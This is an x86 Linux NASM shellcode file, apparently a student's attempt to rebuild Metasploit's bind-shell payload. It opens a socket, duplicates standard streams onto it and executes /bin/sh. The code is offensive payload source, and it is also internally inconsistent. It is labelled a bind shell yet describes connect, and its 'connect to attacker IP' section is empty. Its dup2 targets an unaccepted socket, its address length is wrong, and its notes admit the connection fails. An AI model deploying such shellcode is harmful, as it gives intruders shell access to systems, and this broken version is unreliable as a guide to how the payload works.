; +==-------------------------------------==+
; |         Linux x86 Bind Shell Demo       |
; +==-------------------------------------==+
; | Author:  sp1icer                        |
; | Purpose: Build my own working demo of   |
; |             the shell_bind_tcp          |
; |             shellcode in Metasploit.    |
; +==-------------------------------------==+

; +==-------------------------------------==+
; |                GOALS                    |
; +==-------------------------------------==+
; | Goal 10/26/18: Complete re-write due to |
; |     accidental file deletion.           |
; | Goal 10/26/18: Troubleshoot why the     |
; |     connection is being refused.        |
; +==-------------------------------------==+

; +==-------------------------------------==+
; |             FOREWARNING                 |
; +==-------------------------------------==+
; |      The next section is purely         |
; |      an informational one. To see the   |
; |      code, skip to line XXX. For a file |
; |      without the header, see the file   |
; |      bind_blank.nasm.                   |
; +==-------------------------------------==+

; +==-------------------------------------==+
; |               SYSCALLS                  |
; +==-------------------------------------==+
; | SOCKETCALL 			Call #102   |
; |                                         |
; | int socketcall(int call, unsinged       |
; |                    long *args)          |
; +==-------------------------------------==+
; | calls:                                  |
; |	=> 0x1. SYS_SOCKET                  |
; |	=> 0x3. SYS_CONNECT                 |
; +==-------------------------------------==+
; | 0x1. SYS_SOCKET                         |
; |                                         |
; | int socket(int domain, int type,        |
; |                int protocol)            |
; +==-------------------------------------==+
; | useful domains:                         |
; |                                         |
; |	=> 0x2. AF_INET                     |
; |	=> 0x3. AF_INET6                    |
; +==-------------------------------------==+
; | type:                                   |
; |                                         |
; |	=> 0x1. SOCK_STREAM                 | 
; +==-------------------------------------==+
; | protocol:                               |
; |                                         |
; |	=> 0x0. DEFAULT                     |
; +==-------------------------------------==+
; | 0x3. SYS_CONNECT                        |
; |                                         |
; | int connect(int sockfd, const struct    |
; |              sockaddr *addr,            |
; |              socklen_t addrlen)         |
; +==-------------------------------------==+
; | sockfd:                                 |
; |                                         |
; |	=> Output from SYS_SOCKET.          |
; +==-------------------------------------==+
; | *addr:                                  |
; |                                         |
; | struct sockaddr {                       |
; | 	sa_family_t sin_family;             |
; | 	char sin_port;                      |
; | 	struct in_addr sin_addr;            |
; | };                                      |
; |                                         |
; |	=> family: AF_INET                  |
; |	=> port: 0x8605                     |
; |	=> address: 0x0 (ANY)               |
; +==-------------------------------------==+
; | addrlen:                                |
; |                                         |
; |	=> 0x16                             |
; +==-------------------------------------==+
; | DUP2 			Call #63    |
; |                                         |
; | int dup2(int oldfd, int newfd);         |
; +==-------------------------------------==+
; | oldfd:                                  |
; |                                         |
; |	=> Output from SYS_ACCEPT.          |
; +==-------------------------------------==+
; | newfd:                                  |
; |                                         |
; |	=> 0x0: STDIN                       |
; |	=> 0x1: STDOUT                      |
; |	=> 0x2: STDERR                      |
; +==-------------------------------------==+
; | EXECVE 			Call #11    |
; |                                         |
; | int execve(const char *filename,        |
; |                char *const argv[],      |
; |                char *const envp[]);     |
; +==-------------------------------------==+
; | *filename:                              |
; |                                         |
; |	=> /bin/sh                          |
; +==-------------------------------------==+
; | argv[]:                                 |
; |                                         |
; |	=> 0x0 (NONE)                       |
; +==-------------------------------------==+
; | envp[]:                                 |
; |                                         |
; |	=> 0x0 (NONE)                       |
; +==-------------------------------------==+


; +==-------------------------------------==+
; |            THE SHELLCODE                |
; +==-------------------------------------==+

global _start

section .text
_start:
	; +==-----------------==+
	; |  CREATE THE SOCKET  |
	; +==-----------------==+

	push BYTE 0x66		; Load SOCKETCALL with SYS_SOCKET.
	pop eax
	inc ebx
	xor edi, edi		; XOR'ing to make a perma-null byte.
	push edi 		; DEFAULT PROTOCOL	-> stack
	push 0x1 		; SOCK_STREAM		-> stack
	push 0x2 		; AF_INET		-> stack
	mov ecx, esp		; Move stack args into ECX.
	int 0x80
	mov esi, eax		; Save results to ESI.
	
	; +==-----------------------==+
	; |  REDIRECT INPUTS/OUTPUTS  |
	; +==-----------------------==+

	push BYTE 0x3F		; Load DUP2.
	pop eax
	push esi
	pop ebx
	xor ecx, ecx
	int 0x80
	mov al, 0x3F
	inc ecx
	int 0x80
	mov al, 0x3F
	inc ecx
	int 0x80

	; +==----------------------==+
	; |  CONNECT TO ATTACKER IP  |
	; +==----------------------==+

	

	; +==-------------------==+
	; |  EXECVE TO GET SHELL  |
	; +==-------------------==+

	push 0xB		; Load EXECVE with /bin/sh.
	pop eax
	xor ebx, ebx		; Push null byte to stack.
	push ebx
	push 0x68732f2f		; /bin/sh reversed
	push 0x6e69622f
	mov ebx, esp
	xor ecx, ecx		; NULL for args/envp.
	xor edx, edx
	int 0x80
